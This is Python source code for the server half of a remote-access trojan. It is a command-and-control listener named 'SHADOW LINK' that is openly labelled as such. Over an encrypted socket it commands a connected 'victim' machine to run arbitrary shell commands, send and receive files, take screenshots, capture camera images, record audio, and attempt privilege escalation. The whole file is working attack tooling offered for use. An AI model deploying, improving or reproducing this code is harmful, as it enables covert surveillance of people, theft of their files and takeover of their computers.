import socket
import json
import sys
import os
import ssl
import time

class Listener:
    def __init__(self):
        #SHADOW LINK (Server)
        banner = r"""
        ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗ ██╗     ██╗███╗   ██╗██╗  ██╗
        ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║ ██║     ██║████╗  ██║██║ ██╔╝
        ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║ ██║     ██║██╔██╗ ██║█████╔╝ 
        ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║ ██║     ██║██║╚██╗██║██╔═██╗ 
        ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝ ███████╗██║██║ ╚████║██║  ██╗
        ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝  ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
                                                                                        
                        🌑 Command & Control - "Silent" 💀
                                            v1.0
        """
        SERVER_IP = #your_ip_here  (str)
        PORT = #your_port_here   (int)
        CRIMSON = "\033[38;2;220;20;60m"
        GOLD = "\033[38;2;255;215;0m"
        RESET = "\033[0m"

        for c in banner:
            print(CRIMSON + c + RESET, end="", flush=True)
            time.sleep(0.0015)
        print()  
        print(GOLD + "=" * 70 + RESET)
        print()
        try:
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain(certfile="server.crt", keyfile="server.key")
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((SERVER_IP, PORT))
            listener.listen(5)
            print("[+] Waiting for connections...")
            connect, address = listener.accept()
            print(f"[+] Connection from: {address}")
            self.connect = context.wrap_socket(connect, server_side=True)
            self.connect.settimeout(None)
            self.buffer = b""
            print("[+] TLS ready")
        except Exception as e:
            print(f"[-] Init error: {e}")
            sys.exit(1)

    def recv_exact(self, size):
        data = b""
        while len(data) < size:
            chunk = self.connect.recv(size - len(data))
            if not chunk:
                raise ConnectionError("Connection closed")
            data += chunk
        return data

    def json_send(self, data):
        try:
            json_data = json.dumps(data) + "\n"
            self.connect.sendall(json_data.encode("utf-8"))
        except Exception as e:
            print(f"[-] Send error: {e}")
            raise

    def json_recv(self):
        try:
            while b"\n" not in self.buffer:
                chunk = self.connect.recv(4096)
                if not chunk:
                    raise ConnectionError("Connection lost")
                self.buffer += chunk
            message, sep, self.buffer = self.buffer.partition(b"\n")
            message = message.decode("utf-8", errors='ignore').strip()
            if not message:
                raise ValueError("Empty message")
            return json.loads(message)
        except json.JSONDecodeError as e:
            print(f"[-] JSON error: {e}")
            print(f"    Buffer: {repr(self.buffer[:100])}")
            raise
        except Exception as e:
            print(f"[-] Receive error: {e}")
            raise

    def unique_filename(self, filename):
        if not os.path.exists(filename):
            return filename
        name, ext = os.path.splitext(filename)
        i = 1
        while True:
            new_name = f"{name}_{i}{ext}"
            if not os.path.exists(new_name):
                return new_name
            i += 1

    def send_file(self, filepath):
        try:
            if not os.path.exists(filepath):
                print(f"[-] File not found: {filepath}")
                return False
            filesize = os.path.getsize(filepath)
            header = {"filename": os.path.basename(filepath), "size": filesize}
            header_json = json.dumps(header).encode("utf-8")
            self.connect.sendall(len(header_json).to_bytes(4, "big"))
            self.connect.sendall(header_json)
            with open(filepath, "rb") as f:
                sent = 0
                while sent < filesize:
                    chunk = f.read(32768)
                    if not chunk:
                        break
                    self.connect.sendall(chunk)
                    sent += len(chunk)
            print(f"[+] Sent {filepath} ({filesize} bytes)")
            ack = self.json_recv()
            if ack == "success":
                print(f"[+] Transfer confirmed")
            return True
        except Exception as e:
            print(f"[-] Send error: {e}")
            return False
        
    def recv_file(self):
        try:
            self.buffer = b""
            
            header_len = int.from_bytes(self.recv_exact(4), "big")
            header_json = self.recv_exact(header_len)
            header = json.loads(header_json)
            filename = self.unique_filename(header["filename"])
            filesize = header["size"]
            with open(filename, "wb") as f:
                received = 0
                while received < filesize:
                    chunk_size = min(32768, filesize - received)
                    chunk = self.recv_exact(chunk_size)
                    f.write(chunk)
                    received += len(chunk)
            print(f"[+] Received {filename} ({received} bytes)")
            self.json_send("success")
            return True
        except Exception as e:
            print(f"[-] Receive error: {e}")
            return False
        
    def command_execution(self, command):
        try:
            command = command.strip()
            if not command:
                return True
            
            # Parse command: split only on first space
            parts = command.split(maxsplit=1)
            cmd = parts[0]
            arg = parts[1] if len(parts) > 1 else None
            if cmd == "/exit":
                try:
                    self.json_send(["/exit"])
                    result = self.json_recv()
                    print(f"[+] {result}")
                    return False
                except Exception as e:
                    print(f"[-] Exit error: {e}")
                    return False
                
            elif cmd == "/quit":
                try:
                    self.json_send(["/quit"])
                    result = self.json_recv()
                    print(f"[+] {result}")
                    return False
                except Exception as e:
                    print(f"[-] Quit error: {e}")
                    return False
                
            elif cmd == "download":
                if not arg:
                    print("[-] Usage: download <file>")
                    return True
                try:
                    self.json_send(["download", arg])
                    response = self.json_recv()
                    if response == "ready":
                        self.recv_file()
                    else:
                        print(response)
                except Exception as e:
                    print(f"[-] Download error: {e}")

            elif cmd == "upload":
                if not arg:
                    print("[-] Usage: upload <file>")
                    return True
                try:
                    self.json_send(["upload"])
                    # CRITICAL: Wait for client to be ready
                    response = self.json_recv()
                    if response == "ready":
                        self.send_file(arg)
                    else:
                        print(response)
                except Exception as e:
                    print(f"[-] Upload error: {e}")

            elif cmd == "image":
                if not arg:
                    print("[-] Usage: image <camera_number>")
                    return True
                try:
                    self.json_send(["image", arg])
                    response = self.json_recv()
                    if response == "ready":
                        self.recv_file()
                    else:
                        print(response)
                except Exception as e:
                    print(f"[-] Image error: {e}")

            elif cmd == "screenshot":
                try:
                    self.json_send(["screenshot"])
                    response = self.json_recv()
                    if response == "ready":
                        self.recv_file()
                    else:
                        print(response)
                except Exception as e:
                    print(f"[-] Screenshot error: {e}")

            elif cmd == "audio":
                if not arg:
                    print("[-] Usage: audio <seconds>")
                    return True
                try:
                    self.json_send(["audio", arg])
                    response = self.json_recv()
                    if response == "ready":
                        self.recv_file()
                    else:
                        print(response)
                except Exception as e:
                    print(f"[-] Audio error: {e}")

            elif cmd == "cd":
                try:
                    self.json_send(["cd", arg if arg else ""])
                    result = self.json_recv()
                    print(result)
                except Exception as e:
                    print(f"[-] CD error: {e}")
            elif cmd == "/help":
                print("\n[+] Ready. Available commands:")
                print("  /help               - Show this help message")
                print("  download <file>     - Download file from client")
                print("  upload <file>       - Upload file to client")
                print("  image <camera>      - Capture from camera (0=default)")
                print("  screenshot          - Take screenshot")
                print("  audio <seconds>     - Record audio")
                print("  cd <path>           - Change directory")
                print("  <any shell command> - Execute on client")
                print("  /exit               - Close client and exit")
                print("  /quit               - Disconnect (client keeps running)")
                print("  /admin              - Attempting to assume the victim's authority (if possible)")
                print("  (Note: Commands are case-sensitive)")
                print()

            else:
                try:
                    self.json_send(["shell", command])
                    result = self.json_recv()
                    print(result)
                except Exception as e:
                    print(f"[-] Command error: {e}")
            return True
        except Exception as e:
            print(f"[-] Execution error: {e}")
            return True

    def run(self):
            
        try:
            while True:
                try:
                    command = input(">> ").strip()
                    if not command:
                        continue
                    if not self.command_execution(command):
                        print("[+] Session ended")
                        break
                except KeyboardInterrupt:
                    print("\n[*] Ctrl+C detected")
                    try:
                        self.json_send(["/quit"])
                        self.json_recv()
                    except:
                        pass
                    break
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            try:
                self.connect.close()
            except:
                pass
            print("[+] Connection closed")


if __name__ == "__main__":
    my_listener = Listener()
    my_listener.run()